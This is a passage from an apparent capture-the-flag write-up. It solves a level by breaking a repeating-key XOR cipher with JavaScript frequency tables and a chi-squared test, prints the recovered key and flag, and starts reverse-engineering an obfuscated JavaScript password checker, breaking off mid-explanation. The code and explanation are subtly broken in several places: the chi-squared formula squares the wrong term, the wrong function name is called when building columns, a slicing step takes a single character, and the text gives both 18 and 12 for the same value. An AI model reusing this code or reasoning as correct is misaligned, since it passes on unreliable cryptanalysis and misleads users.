    # Save ASCII code of letter and its occurence frequency 
    percent_freqs[ord(k)] = &#34;{0:.8f}&#34;.format(v/float(file_size))
    
# For all other unoccured letters, store occurence = 0
for i in xrange(0, 256):
    if not i in percent_freqs:
        percent_freqs[i] = &#34;{0:.8f}&#34;.format(0)
</code></pre></div><p>And the results (frequency (<code>occurences / length of text</code>) of every ASCII code (0-255)):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0: &#39;0.00000000&#39;,
1: &#39;0.00000000&#39;,
2: &#39;0.00000000&#39;,
3: &#39;0.00000000&#39;,
4: &#39;0.00000000&#39;,
5: &#39;0.00000000&#39;,
6: &#39;0.00000000&#39;,
7: &#39;0.00000000&#39;,
8: &#39;0.00000000&#39;,
9: &#39;0.00000000&#39;,
10: &#39;0.00000000&#39;,
11: &#39;0.00000000&#39;,
12: &#39;0.00000000&#39;,
13: &#39;0.00000000&#39;,
14: &#39;0.00000000&#39;,
15: &#39;0.00000000&#39;,
16: &#39;0.00000000&#39;,
17: &#39;0.00000000&#39;,
18: &#39;0.00000000&#39;,
19: &#39;0.00000000&#39;,
20: &#39;0.00000000&#39;,
21: &#39;0.00000000&#39;,
22: &#39;0.00000000&#39;,
23: &#39;0.00000000&#39;,
24: &#39;0.00000000&#39;,
25: &#39;0.00000000&#39;,
26: &#39;0.00000000&#39;,
27: &#39;0.00000000&#39;,
28: &#39;0.00000000&#39;,
29: &#39;0.00000000&#39;,
30: &#39;0.00000000&#39;,
31: &#39;0.00000000&#39;,
32: &#39;0.01812754&#39;,
33: &#39;0.00193988&#39;,
34: &#39;0.00815033&#39;,
35: &#39;0.00004708&#39;,
36: &#39;0.00051322&#39;,
37: &#39;0.00041905&#39;,
38: &#39;0.00636583&#39;,
39: &#39;0.00004708&#39;,
40: &#39;0.04071399&#39;,
41: &#39;0.04069045&#39;,
42: &#39;0.00575844&#39;,
43: &#39;0.00960524&#39;,
44: &#39;0.04891611&#39;,
45: &#39;0.00621987&#39;,
46: &#39;0.03376902&#39;,
47: &#39;0.00278270&#39;,
48: &#39;0.01191709&#39;,
49: &#39;0.01123437&#39;,
50: &#39;0.00605507&#39;,
51: &#39;0.00363493&#39;,
52: &#39;0.00311700&#39;,
53: &#39;0.00340892&#39;,
54: &#39;0.00335242&#39;,
55: &#39;0.00287686&#39;,
56: &#39;0.00314525&#39;,
57: &#39;0.00240131&#39;,
58: &#39;0.00955816&#39;,
59: &#39;0.00938865&#39;,
60: &#39;0.00283920&#39;,
61: &#39;0.04037027&#39;,
62: &#39;0.00172329&#39;,
63: &#39;0.00500038&#39;,
64: &#39;0.00000471&#39;,
65: &#39;0.00191163&#39;,
66: &#39;0.00075806&#39;,
67: &#39;0.00151141&#39;,
68: &#39;0.00075806&#39;,
69: &#39;0.00172329&#39;,
70: &#39;0.00072510&#39;,
71: &#39;0.00051322&#39;,
72: &#39;0.00062152&#39;,
73: &#39;0.00083810&#39;,
74: &#39;0.00045201&#39;,
75: &#39;0.00032017&#39;,
76: &#39;0.00102173&#39;,
77: &#39;0.00336184&#39;,
78: &#39;0.00204818&#39;,
79: &#39;0.00083340&#39;,
80: &#39;0.00110649&#39;,
81: &#39;0.00044730&#39;,
82: &#39;0.00093698&#39;,
83: &#39;0.00211410&#39;,
84: &#39;0.00190692&#39;,
85: &#39;0.00108765&#39;,
86: &#39;0.00052264&#39;,
87: &#39;0.00056501&#39;,
88: &#39;0.00060739&#39;,
89: &#39;0.00084281&#39;,
90: &#39;0.00046614&#39;,
91: &#39;0.01026914&#39;,
92: &#39;0.00071098&#39;,
93: &#39;0.01026914&#39;,
94: &#39;0.00015538&#39;,
95: &#39;0.00870122&#39;,
96: &#39;0.00000000&#39;,
97: &#39;0.03085449&#39;,
98: &#39;0.00537234&#39;,
99: &#39;0.02432387&#39;,
100: &#39;0.01068819&#39;,
101: &#39;0.05399653&#39;,
102: &#39;0.02127750&#39;,
103: &#39;0.00949695&#39;,
104: &#39;0.01913044&#39;,
105: &#39;0.03976759&#39;,
106: &#39;0.00063564&#39;,
107: &#39;0.00203876&#39;,
108: &#39;0.02091024&#39;,
109: &#39;0.00833867&#39;,
110: &#39;0.06739679&#39;,
111: &#39;0.03298271&#39;,
112: &#39;0.01149804&#39;,
113: &#39;0.00092757&#39;,
114: &#39;0.04578499&#39;,
115: &#39;0.02443687&#39;,
116: &#39;0.07868295&#39;,
117: &#39;0.03190447&#39;,
118: &#39;0.00903552&#39;,
119: &#39;0.00426586&#39;,
120: &#39;0.00836692&#39;,
121: &#39;0.00838105&#39;,
122: &#39;0.00147845&#39;,
123: &#39;0.01152158&#39;,
124: &#39;0.00274032&#39;,
125: &#39;0.01152158&#39;,
126: &#39;0.00000000&#39;,
127: &#39;0.00000000&#39;,
128: &#39;0.00000000&#39;,
129: &#39;0.00000000&#39;,
130: &#39;0.00000000&#39;,
131: &#39;0.00000000&#39;,
132: &#39;0.00000000&#39;,
133: &#39;0.00000000&#39;,
134: &#39;0.00000000&#39;,
135: &#39;0.00000000&#39;,
136: &#39;0.00000000&#39;,
137: &#39;0.00000000&#39;,
138: &#39;0.00000000&#39;,
139: &#39;0.00000000&#39;,
140: &#39;0.00000000&#39;,
141: &#39;0.00000000&#39;,
142: &#39;0.00000000&#39;,
143: &#39;0.00000000&#39;,
144: &#39;0.00000000&#39;,
145: &#39;0.00000000&#39;,
146: &#39;0.00000000&#39;,
147: &#39;0.00000000&#39;,
148: &#39;0.00000000&#39;,
149: &#39;0.00000000&#39;,
150: &#39;0.00000000&#39;,
151: &#39;0.00000000&#39;,
152: &#39;0.00000000&#39;,
153: &#39;0.00000000&#39;,
154: &#39;0.00000000&#39;,
155: &#39;0.00000000&#39;,
156: &#39;0.00000000&#39;,
157: &#39;0.00000000&#39;,
158: &#39;0.00000000&#39;,
159: &#39;0.00000000&#39;,
160: &#39;0.00000000&#39;,
161: &#39;0.00000000&#39;,
162: &#39;0.00000000&#39;,
163: &#39;0.00000000&#39;,
164: &#39;0.00000000&#39;,
165: &#39;0.00000000&#39;,
166: &#39;0.00000000&#39;,
167: &#39;0.00000000&#39;,
168: &#39;0.00000000&#39;,
169: &#39;0.00000000&#39;,
170: &#39;0.00000000&#39;,
171: &#39;0.00000000&#39;,
172: &#39;0.00000000&#39;,
173: &#39;0.00000000&#39;,
174: &#39;0.00000000&#39;,
175: &#39;0.00000000&#39;,
176: &#39;0.00000000&#39;,
177: &#39;0.00000000&#39;,
178: &#39;0.00000000&#39;,
179: &#39;0.00000000&#39;,
180: &#39;0.00000000&#39;,
181: &#39;0.00000471&#39;,
182: &#39;0.00000000&#39;,
183: &#39;0.00000000&#39;,
184: &#39;0.00000000&#39;,
185: &#39;0.00000000&#39;,
186: &#39;0.00000000&#39;,
187: &#39;0.00000000&#39;,
188: &#39;0.00000000&#39;,
189: &#39;0.00000000&#39;,
190: &#39;0.00000000&#39;,
191: &#39;0.00000000&#39;,
192: &#39;0.00000000&#39;,
193: &#39;0.00000000&#39;,
194: &#39;0.00000471&#39;,
195: &#39;0.00000000&#39;,
196: &#39;0.00000000&#39;,
197: &#39;0.00000000&#39;,
198: &#39;0.00000000&#39;,
199: &#39;0.00000000&#39;,
200: &#39;0.00000000&#39;,
201: &#39;0.00000000&#39;,
202: &#39;0.00000000&#39;,
203: &#39;0.00000000&#39;,
204: &#39;0.00000000&#39;,
205: &#39;0.00000000&#39;,
206: &#39;0.00000000&#39;,
207: &#39;0.00000000&#39;,
208: &#39;0.00000000&#39;,
209: &#39;0.00000000&#39;,
210: &#39;0.00000000&#39;,
211: &#39;0.00000000&#39;,
212: &#39;0.00000000&#39;,
213: &#39;0.00000000&#39;,
214: &#39;0.00000000&#39;,
215: &#39;0.00000000&#39;,
216: &#39;0.00000000&#39;,
217: &#39;0.00000000&#39;,
218: &#39;0.00000000&#39;,
219: &#39;0.00000000&#39;,
220: &#39;0.00000000&#39;,
221: &#39;0.00000000&#39;,
222: &#39;0.00000000&#39;,
223: &#39;0.00000000&#39;,
224: &#39;0.00000000&#39;,
225: &#39;0.00000000&#39;,
226: &#39;0.00000000&#39;,
227: &#39;0.00000000&#39;,
228: &#39;0.00000000&#39;,
229: &#39;0.00000000&#39;,
230: &#39;0.00000000&#39;,
231: &#39;0.00000000&#39;,
232: &#39;0.00000000&#39;,
233: &#39;0.00000000&#39;,
234: &#39;0.00000000&#39;,
235: &#39;0.00000000&#39;,
236: &#39;0.00000000&#39;,
237: &#39;0.00000000&#39;,
238: &#39;0.00000000&#39;,
239: &#39;0.00000000&#39;,
240: &#39;0.00000000&#39;,
241: &#39;0.00000000&#39;,
242: &#39;0.00000000&#39;,
243: &#39;0.00000000&#39;,
244: &#39;0.00000000&#39;,
245: &#39;0.00000000&#39;,
246: &#39;0.00000000&#39;,
247: &#39;0.00000000&#39;,
248: &#39;0.00000000&#39;,
249: &#39;0.00000000&#39;,
250: &#39;0.00000000&#39;,
251: &#39;0.00000000&#39;,
252: &#39;0.00000000&#39;,
253: &#39;0.00000000&#39;,
254: &#39;0.00000000&#39;,
255: &#39;0.00000000&#39;
</code></pre></div><h3 id="split-ciphertext-into-columns">Split ciphertext into columns</h3>
<p>Now the ciphertext will be splitted into columns:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">def make_columns(text, key_length):
    &#34;&#34;&#34; Returns columns of length = key_length for text&#34;&#34;&#34;
    blocks = []
    
    # Divide ciphertext into blocks of length = key_length
    for i in xrange(0, len(text)/key_length):
        blocks.append(list(text[key_length*i:key_length*i+key_length]))

    # Create list: [[blocks[0][0], blocks[0][1], ...], [blocks[1][0], blocks[1][1], ...]]
    columns = map(list,zip(*blocks))
    
    # What about remaining text that doesn&#39;t fit into one block?
    if len(text) % key_length:
        remaining = text[key_length*(len(text)/key_length)]
        for i in xrange(len(remaining)):
            columns[i].append(remaining[i])
            
    return columns

columns = char_distribution(ciphertext, 9)
</code></pre></div><p>The columns will look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">1st column: [&#39;+&#39;, &#39;\t&#39;, &#39;J&#39;, &#39;\x03&#39;, &#39;I&#39;, &#39;\x0f&#39;, &#39;\x0e&#39;, &#39;\x14&#39;, &#39;\x15&#39;]
2nd column: [&#39;\x1a&#39;, &#39;\x00&#39;, &#39;\x10&#39;, &#39;?&#39;, &#39;\x1a&#39;, &#39;q&#39;, &#39;\\&#39;, &#39;[&#39;, &#39;[&#39;]
3rd column: [&#39;\x00&#39;, &#39;\x1a&#39;, &#39;\x16&#39;, &#39;8&#39;, &#39;\x06&#39;, &#39;F&#39;, &#39;f&#39;, &#39;Z&#39;, &#39;U&#39;]
...
</code></pre></div><p>Now for every column we&rsquo;ll try to decrypt every single character with every single ASCII code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">decrypted = []

for code in ASCII-code table:
    for c in ciphertext:
        decrypted.append(ASCII(c) XOR code)
</code></pre></div><p>Then using the <strong>Chi squared distribution</strong> we&rsquo;ll try to guess the right key.</p>
<h3 id="chi-squared">Chi squared</h3>
<p>In order to compare the letter distribution in our ciphertext against the one based on the D3 JavaScript code, I&rsquo;ll use
the <a href="https://en.wikipedia.org/wiki/Chi-squared_test">Chi-squared test</a>. The lower the value of the test, the higher the
probability that the decryption was successful.</p>
<blockquote>
<p>You read more about this test and its application on this <a href="https://schoolcodebreaking.com/2015/06/18/using-chi-squared-to-crack-codes/">site</a>.</p>
</blockquote>
<p>Let&rsquo;s have a look at the function:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">def chi_squared(ciphertext, freqs):
    d = collections.Counter(ciphertext)
    res = []
    
    for k,v in freqs.iteritems():
        c = 0
        decrypted = []
        
        for i in ciphertext:
            # Do the XOR operation
            decrypted.append(chr(k ^ ord(i)))
        
        for l in decrypted:
            # Apply the Chi squared test:
            # 
            #   sum = 0
            #   for every character c in s do:
            #         expected_count = length(ciphertext) * frequency_table(c)
            #         real_count = &lt;number of occurences of c in ciphertext&gt;
            #         sum += (real_count - expected_count) ** 2 / expected_count
            #       
            expected_count = float(len(ciphertext) * float(freqs[ord(l)]))
            real_count = float(d[l])
            
            # Avoid division by 0
            if expected_count &gt; 0:
                c+= (real_count - expected_count ** 2) / expected_count
    
        res.append(c)
        
    return res
</code></pre></div><p>Calling <code>chi_squared</code> for 1 column will result in:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
In: res = chi_squared(columns[1], percent_freqs)
    print(res)

Out:
[1204.0071598955076, 132.69115840125667, 156.88989851219517, -0.5120435, -0.31970324999999994, -1.20453925, 197.41879944181383, 151.8388795573118, 503.24009691571695, 411.65284864671304, -0.4913265, -0.597738, -0.442006, -0.9232095, 550.973125350628, -0.9422795000000002, -1.97554875, 112.91112495380644, -1.37063125, 253.89327851000215, 193.27461811570058, 240.8167847502026, 90.26352190725298, 113.79535634950395, -0.8113835, -0.38950650000000003, -1.1428595, -0.53958825, -1.13403175, 724.9582258341832, -0.7774827499999999, 336.2412614397023, -15.37686425, -13.009572250000002, 15.248560533383667, -7.447359500000001, 4.960532266691834, 18.985424033383673, -13.246172249999999, -12.268931749999998, -9.796406249999999, -10.96645725, -8.460382000000001, -4.980248, -8.065697, -3.6118532499999993, -9.84455025, -6.581239749999999, -3.999948, 17.86010353338367, 3.292327766691833, -0.45218773330816175, -13.234165249999998, -11.654832499999998, 5.558857766691837, -6.817603499999999, 35.232116300075496, -3.5466412499999995, -7.71868325, -12.425487750000004, -8.796331, -11.285571499999998, -4.20782625, -4.22630725, -0.87647875, 316.30210052362025, -0.641173, -0.8119722500000001, 191.54275272870169, 190.94972397870168, 548.681857770912, 232.7529211402615, 308.9709771145051, 77.55519354675381, 112.7322042038064, 41.02265209830615, 166.99850270400682, 204.15363525675696, 240.56747225020254, 898.424703306807, 107.35915740825043, -1.6951602499999998, 639.3337544274882, 191.29367522870172, -1.5721524999999998, 383.07185095740346, -2.52726175, -1.3689824999999998, 85.08040990669491, 156.5445342621952, 246.78820900076062, 477.2429975685118, 278.8510253123129, 195.35849744181385, 35.343556302750144, -1.16404675, -5.610121, -10.09044875, -4.324948750000002, -10.18779675, -5.821883999999998, -9.57581525, -10.021117499999997, -12.096838249999998, 35.22731731944197, -14.04272425, 105.1791471900786, -5.272878250000001, -6.86198075, -8.2800495, -16.013682749999997, -18.115417499999996, -4.6716092499999995, -3.1645502500000005, -14.291094750000001, -9.652209999999998, -14.05896775, -7.868530249999998, -3.6054972499999995, 240.36540654546903, -7.772713000000001, 58.91218238168983, -8.7063995, -11.287926749999999, -11.670488249999996, -8.546783249999999, 57.91177537119466, 82.03075531344567, 0, 0, 0, -0.00023549999999999998, -0.00011774999999999999, -0.00011774999999999999, 0, 0, 0, 0, 0, 0, 0, -0.00058875, 0, 0, -0.00023549999999999998, 0, -0.00011774999999999999, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -0.00023549999999999998, -0.00011774999999999999, 0, 0, 0, 0, 0, -0.00023549999999999998, 0, 0, 0, 0, 0, -0.00035324999999999994, 0, 0, 0, 0, 0, -0.00011774999999999999, -0.00023549999999999998, 0, -0.00011774999999999999, -0.00011774999999999999, 0, 0, -0.00035324999999999994, 0, 0, 0, 0, 0, -0.00011774999999999999, -0.00011774999999999999, 0, -0.00023549999999999998, -0.00011774999999999999, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -0.00023549999999999998, 0, 0, 0, 0, 0, -0.00011774999999999999, -0.00023549999999999998, 0, 0, 0, 0, 0, -0.00011774999999999999, 0, -0.00023549999999999998, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -0.00011774999999999999, -0.00011774999999999999, -0.00023549999999999998, 0, 0, 0, 0, 0, -0.00058875, 0, 0, 0, 0, 0]
</code></pre></div><p>For the test we&rsquo;ll take the lowest value and try to convert that to some character:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">In: print(chr(res.index(min(res))))

Out:
o
</code></pre></div><p>Now let&rsquo;s apply that for all columns:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">key = &#39;&#39;

for i in columns:
    res = chi_squared(i, percent_freqs)
    key += chr(res.index(min(res)))
</code></pre></div><p>And the key is &hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">In: print(key)

Out:
Bobki2347
</code></pre></div><p>Hmmm&hellip;That looks promising. Let&rsquo;s decrypt the message:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Adapted from https://gist.github.com/revolunet/2412240
def xor(message,key):
    return &#39;&#39;.join(chr(ord(c)^ord(k)) for c,k in izip(message, cycle(key)))

print(xor(ciphertext, key))
</code></pre></div><p>&hellip; and voila:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">if(h == &#34;XorTsCoolButSotUnbreavable&#34;) {=if(documxnt.locatton.href.tndexOf(&#34;&#34;p=&#34;) == 01) { dochment.loc|tion = drcument.lrcation.hoef + &#34;?p &#34; + u; }=} else {= $(&#34;#crenponse&#34;).utml(&#34;&lt;dik class=&#39;xrror&#39;&gt;Wrrng passwrrd sorry3&lt;/div&gt;&#34;)&amp; }
</code></pre></div><p>Well that&rsquo;s <strong>almost</strong> perfect! As you can see, although the key is not the right one, the decrypted message almost reveals the original
text (as I&rsquo;ve mentioned above, polyalphabetic ciphers are not secure since even pieces of information about the key could reveal the message).
However, from the code you can deduce that the key is <code>XorIsCoolButNotUnbreakable</code>. And that leads to the flag: <code>FLAG-rhwMJNczASAJ4WgwfIA7fcJD</code>.</p>
<h2 id="level-8-wtf-lol">Level 8: WTF Lol!</h2>
<p>Yeah,  this challenge was a little bit like &ldquo;WTF?LOL?!&rdquo;. But first let&rsquo;s have a look at the code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">1 function check_password(password) {
2    var stack = &#34;qwertyuiopasdfghjklzxcvbnm&#34;.split(&#34;&#34;);
3    var tmp = {
4        &#34;t&#34; : 9, &#34;h&#34; : 6, &#34;e&#34; : 5,
5        &#34;f&#34; : 1, &#34;l&#34; : 2, &#34;a&#34; : 3, &#34;g&#34; : 4,
6         &#34;i&#34; : 7, &#34;s&#34; : 8, 
7         &#34;j&#34; : 10, &#34;u&#34; : 11, &#34;m&#34; : 12, &#34;p&#34; : 13,
8         &#34;b&#34; : 14, &#34;r&#34; : 15, &#34;o&#34; : 16, &#34;w&#34; : 17, &#34;n&#34; : 18,
9         &#34;c&#34; : 19, &#34;d&#34; : 20, &#34;j&#34; : 21, &#34;k&#34; : 22, &#34;q&#34; : 23, 
10         &#34;v&#34; : 24, &#34;x&#34; : 25, &#34;z&#34; : 26
11     };
12     var i = 2;
13     
14     var a1 = Number.prototype.valueOf;
15     var a2 = Number.prototype.toString;
16     var a3 = Array.prototype.valueOf;
17     var a4 = Array.prototype.toString;
18     var a5 = Object.prototype.valueOf;
19     var a6 = Object.prototype.toString;
20 
21     function f1() { return stack[ i++ % stack.length ].charCodeAt(0); }
22     function f2() { i += 3; return stack.pop(); }
23     function f3() { 
24         for (k in this) { 
25             if (this.hasOwnProperty(k)) {
26                 i += stack.indexOf(this[k][0]); 
27                 stack.push(this[k]); 
28             } 
29         } 
30         return String.fromCharCode(new Number(stack[ i % stack.length ].charCodeAt(0))); 
31     }
32 
33     Number.prototype.valueOf = Number.prototype.toString = f1;
34     Array.prototype.valueOf  = Array.prototype.toString  = f2;
35     Object.prototype.valueOf = Object.prototype.toString = f3;
36     
37     var a  = (tmp[ [] ] * tmp[ [] ] * 1337 + tmp[ &#34;&#34; + { &#34;wtf&#34;: password[1] } ]) / (tmp[ &#34;&#34; + { &#34;wtf&#34;: password[0] } ] - tmp[ [] ]);
38     var b  = (tmp[ [] ] * tmp[ [] ] * 7331 + tmp[ &#34;&#34; + { &#34;lol&#34;: &#34;o&#34; } ]) / (tmp[ &#34;&#34; + { &#34;wtf&#34;: password[1] } ] - tmp[ [] ]);
39     var c  = (tmp[ [] ] * tmp[ [] ] * 1111 + tmp[ &#34;&#34; + { &#34;wtf&#34;: password[3] } ]) / (tmp[ &#34;&#34; + { &#34;lol&#34;: password[2] } ] - tmp[ [] ]);
40     var d  = (tmp[ [] ] * tmp[ [] ] * 3333 + tmp[ &#34;&#34; + { &#34;wtf&#34;: &#34;g&#34; } ]) / (tmp[ &#34;&#34; + { &#34;wtf&#34;: password[3] } ] - tmp[ [] ]);
41     var e  = (tmp[ [] ] * tmp[ [] ] * 7777 + tmp[ &#34;&#34; + { &#34;wtf&#34;: &#34;a&#34; } ]) / (tmp[ &#34;&#34; + { &#34;wtf&#34;: password[7] } ] - tmp[ [] ]);
42     var f  = (tmp[ [] ] * tmp[ [] ] * 2222 + tmp[ &#34;&#34; + { &#34;wtf&#34;: password[7] } ]) / (tmp[ &#34;&#34; + { &#34;lol&#34;: password[5] } ] - tmp[ [] ]);
43     var g  = (tmp[ [] ] * tmp[ [] ] * 6666 + tmp[ &#34;&#34; + { &#34;lol&#34;: password[4] } ]) / (tmp[ &#34;&#34; + { &#34;wtf&#34;: password[6] } ] - tmp[ [] ]);
44     var h  = (tmp[ [] ] * tmp[ [] ] * 1234 + tmp[ &#34;&#34; + { &#34;wtf&#34;: &#34;a&#34; } ]) / (tmp[ &#34;&#34; + { &#34;wtf&#34;: password[4] } ] - tmp[ [] ]);
45     var ii = (tmp[ [] ] * tmp[ [] ] * 2345 + tmp[ &#34;&#34; + { &#34;wtf&#34;: &#34;h&#34; } ]) / (tmp[ &#34;&#34; + { &#34;wtf&#34;: password[9] } ] - tmp[ [] ]);
46     var j  = (tmp[ [] ] * tmp[ [] ] * 3456 + tmp[ &#34;&#34; + { &#34;wtf&#34;: password[9] } ]) / (tmp[ &#34;&#34; + { &#34;lol&#34;: password[8] } ] - tmp[ [] ]);
47     var kk = (tmp[ [] ] * tmp[ [] ] * 4567 + tmp[ &#34;&#34; + { &#34;lol&#34;: password[11] } ]) / (tmp[ &#34;&#34; + { &#34;wtf&#34;: password[10] } ] - tmp[ [] ]);
48     var l  = (tmp[ [] ] * tmp[ [] ] * 9999 + tmp[ &#34;&#34; + { &#34;wtf&#34;: &#34;o&#34; } ]) / (tmp[ &#34;&#34; + { &#34;wtf&#34;: password[11] } ] - tmp[ [] ]);
49 
50     Number.prototype.valueOf   = a1;
51     Number.prototype.toString  = a2;
52     Array.prototype.valueOf    = a3;
53     Array.prototype.toString   = a4;
54     Object.prototype.valueOf   = a5;
55  
56     Object.prototype.toString  = a6;
57     var m = a === b &amp;&amp; b === c &amp;&amp; c === d &amp;&amp; d === e &amp;&amp; e === f &amp;&amp; f === g &amp;&amp; g === h &amp;&amp; h === ii &amp;&amp; ii === j &amp;&amp; j === kk &amp;&amp; kk === l;
58  
59     var n = password[0] != password[1] &amp;&amp; password[2] != password[3] &amp;&amp; password[4] != password[5]  &amp;&amp; password[6] != password[7]  &amp;&amp; password[8] != password[9] &amp;&amp; password[10] != password[11]
60  
61     return m &amp;&amp; n;
62  }
63  
64  function btn_click(value) {
65     try {
66         if (check_password(document.getElementById(&#39;pwd&#39;).value)) {
67             alert(&#39;That\&#39;s the flag !&#39;);
68             return;
69         }
70     } catch(e) {}
71         alert(&#39;Nope !&#39;);
72  }
</code></pre></div><p>In function <code>check_password</code> you have a lot of JavaScript voodoo which looks like some obfuscation techniques. I think the most important lines are 33-35:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">33     Number.prototype.valueOf = Number.prototype.toString = f1;
34     Array.prototype.valueOf  = Array.prototype.toString  = f2;
35     Object.prototype.valueOf = Object.prototype.toString = f3;
</code></pre></div><p>By using their prototypes the behaviour of <code>Number</code>, <code>Array</code> and <code>Object</code> are changed. Every time these prototypes are being used <code>f1()</code>,
<code>f2()</code> and <code>f3()</code> are called respectively. That means:</p>
<ul>
<li>every time a <code>Number</code> type calls <code>valueof()</code> or <code>toString()</code>, <code>f1</code> is called</li>
<li>the same applies to <code>Array</code> and <code>Object</code> respectively</li>
</ul>
<p>Later on the &ldquo;normal&rdquo; behaviour gets restored:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">50     Number.prototype.valueOf   = a1;
51     Number.prototype.toString  = a2;
52     Array.prototype.valueOf    = a3;
53     Array.prototype.toString   = a4;
54     Object.prototype.valueOf   = a5;
</code></pre></div><p>In lines 37-48 we have some variables with some array operations, string concatenations and some arithmetics. For the sake of simplicity let&rsquo;s
have a look at variable <code>a</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">37     var a  = (tmp[ [] ] * tmp[ [] ] * 1337 + tmp[ &#34;&#34; + { &#34;wtf&#34;: password[1] } ]) / (tmp[ &#34;&#34; + { &#34;wtf&#34;: password[0] } ] - tmp[ [] ]);
</code></pre></div><p>And now let&rsquo;s split it to its internal operations:</p>
<ul>
<li><code>tmp[ [] ]</code></li>
</ul>
<p>We remember that the function <code>valueof()</code> of <code>Array</code> was overridden by <code>f2()</code>. <code>f2()</code> will</p>
<ul>
<li><strong>pop</strong> some value from the variable <code>stack</code> (line 2)</li>
<li>increment some index by 3 (line 22)</li>
<li>the <strong>popped</strong> value from the stack will be then used as an index for <code>tmp</code> (line 3-10)</li>
<li>the return value of the operation will be: <code>tmp[index]</code></li>
</ul>
<p>Example: The first popped value will be <code>m</code>. The value of <code>tmp['m']</code> is 12 (line 7). So the return value of the first
<code>tmp[ [] ]</code> operation will be 18.</p>
<ul>
<li><code>tmp[ [] ] * tmp[ [] ] * 1337</code></li>
</ul>
<p>Here we have another <code>Array</code> operation, so the return value will be: <code>tmp[&lt;popped character from stack&gt;]</code>. Afterwards the two
previous values are multiplicated and the result is again multiplicated by <code>1337</code>. In this case we have:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">return value of first Array operation: 12
return value of 2nd Array operation: 18 (the popped value from stack is &#39;m&#39;)

The result will be: 12 * 18 * 1337
</code></pre></div><ul>
<li><code>tmp[ &quot;&quot; + { &quot;wtf&quot;: password[1] } ]</code></li>
</ul>
<p>Here we have:</p>
<ul>
<li>an Object: <code>{ &quot;wtf&quot;: password[1] }</code></li>
<li>the concatenation of an empty string <code>&quot;&quot;</code> with an Object</li>
</ul>
<p>In this case the function <code>toString()</code> of the Object will be called, which is <code>f3()</code> (see line 35). Now let&rsquo;s have a look at <code>f3()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">23     function f3() { 
24         for (k in this) { 
25             if (this.hasOwnProperty(k)) {
26                 i += stack.indexOf(this[k][0]); 
27                 stack.push(this[k]); 
28             } 
29         } 
30         return String.fromCharCode(new Number(stack[ i % stack.length ].charCodeAt(0))); 
31     }
</code></pre></div><p>If we have an Object like this <code>{ &quot;wtf&quot;: value }</code>, <code>f3()</code> will then increase the iterator (i) by the index of <code>value</code> in <code>stack</code>.
Afterwards <code>value</code> will be then pushed into <code>stack</code>. Example: If we had sth like <code>{ &quot;wtf&quot;: &quot;w&quot; }</code> the iterator will increase by 1
since <code>w</code> is at index 1 in <code>stack</code>. Afterwards <code>w</code> will be pushed into <code>stack</code>. So far so good.</p>
<p>However, line 30 looks very strange. If you look closely, the <code>valueof()</code> function of type <code>Number</code> is being called. This however
will call <code>f1()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">21     function f1() { return stack[ i++ % stack.length ].charCodeAt(0); }
</code></pre></div><p>So you basically have values that</p>
<ul>
<li>get pushed <strong>into</strong> the stack</li>
<li>depending on their index <strong>in</strong> the stack and some <strong>iterator</strong> return some values from <code>tmp</code></li>
</ul>
<p>After the calculations of <code>a</code>, <code>b</code>, <code>c</code> etc. the normal behaviour is being restored:</p>
